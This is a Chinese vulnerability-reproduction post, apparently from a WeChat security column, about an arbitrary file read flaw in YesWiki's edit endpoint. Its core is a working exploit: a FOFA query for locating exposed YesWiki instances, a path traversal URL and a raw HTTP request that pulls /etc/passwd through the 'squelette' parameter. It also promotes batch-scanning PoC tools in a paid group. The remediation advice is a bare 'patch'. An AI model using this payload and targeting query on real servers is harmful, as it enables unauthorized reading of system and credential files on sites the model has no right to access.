#  YesWiki知识库edit接口存在任意文件读取漏洞 附POC   
2025-4-10更新  南风漏洞复现文库   2025-04-10 23:27  
  
   
  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. YesWiki知识库简介  
  
微信公众号搜索：南风漏洞复现文库  
  
该文章 南风漏洞复现文库 公众号首发  
  
YesWiki知识库  
## 2.漏洞描述  
  
YesWiki是一个开源、易用的 Wiki 平台，基于 PHP 和 MySQL 开发，适合个人、团队和组织快速搭建知识库或协作平台。它无需复杂配置，安装简单，支持多语言和插件扩展，用户可通过可视化编辑器轻松创建和编辑内容，适合技术门槛较低的用户使用。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
YesWiki知识库  
  
![YesWiki知识库edit接口存在任意文件读取漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFS1Ns91BJUOlreQkKp3DlNjQDBoqn0Kyib6H7fjbSWD9HKtQpGt8pGlA/640?wx_fmt=png&from=appmsg "null")  
  
YesWiki知识库edit接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
app="YesWiki"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/?UrkCEO/edit&theme=margot&squelette=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&style=margot.css  
  
漏洞数据包：  
```
GET /?UrkCEO/edit&theme=margot&squelette=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&style=margot.css HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFibGho4Qc5q9ec9lHvhdYZicn3RFCx8j5N5IKradWwRmEl2nRnMKic8Ocg/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
  
  
2: 免登录，免费fofa查询。  
  
  
3: 更新其他实用网络安全工具项目。  
  
  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFibjatuPibXP6ib11PUTYuZNvf6bqaia7wiaRRwfZgxhwaHhiaicSlaUQ7Y9pg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFPe9AYKAVMbic0Ea5FP5s6WxBjtTtFRhuteyUL3TmS3aT9PXb4v8okMw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFPhnX44uplFRfX0aSGgiavvRzIoJxrrRMtbnQwkFsNibh6Gu0vthiam4CA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFibfyGxEmc3RMhSM0Fnqeslsicwlqydf3VD6VaEYoEawPmIlRp2oXePAg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFqtUkTIibIuodGZXoUXLkVWar24PnhBT5icibKmCn831enlylYmla6aiacg/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
  
